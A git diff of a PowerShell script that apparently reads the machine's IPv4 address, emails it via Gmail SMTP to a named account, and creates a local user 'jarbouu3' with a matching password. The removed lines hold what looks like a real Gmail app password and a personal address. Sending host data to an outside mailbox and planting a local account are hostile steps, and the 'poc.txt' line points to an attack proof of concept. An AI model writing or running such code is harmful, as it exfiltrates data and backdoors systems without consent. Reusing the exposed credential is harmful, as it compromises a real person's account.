@@ -40,7 +40,7 @@ $ip = $ipConfigOutput | Select-String -Pattern 'IPv4 Address.*: ((\d{1,3}\.){3}\
 
 # If IPv4 address is found, proceed with sending the email
 if ($ip) {
-    $body = "This is a test email sent via PowerShell, ched addresset ip: $ip :D ."
+    $body = "Ched addresset ip: $ip :D ."
     # Send the email here
 } else {
     $body = "IPv4 address not found."
@@ -50,7 +50,7 @@ if ($ip) {
 $smtpServer = "smtp.gmail.com"
 $smtpPort = 587
 $username = "firas.riahi@ensi-uma.tn"
-$password = "ijrw kynq kdsm tjki " # Or your app password if you have two-factor authentication enabled
+$password = "" # your app password if you have two-factor authentication enabled
 
 # Create the email object
 $email = New-Object System.Net.Mail.MailMessage
@@ -76,9 +76,6 @@ if (-not (Test-Path $path)) {
 
 # Change directory
 Set-Location $path
-
-# Now you can proceed with your script
-Write-Output "" > poc.txt
 
 $NewName = "jarbouu3"
 $Password = (ConvertTo-SecureString "jarbouu3" -AsPlainText -Force)
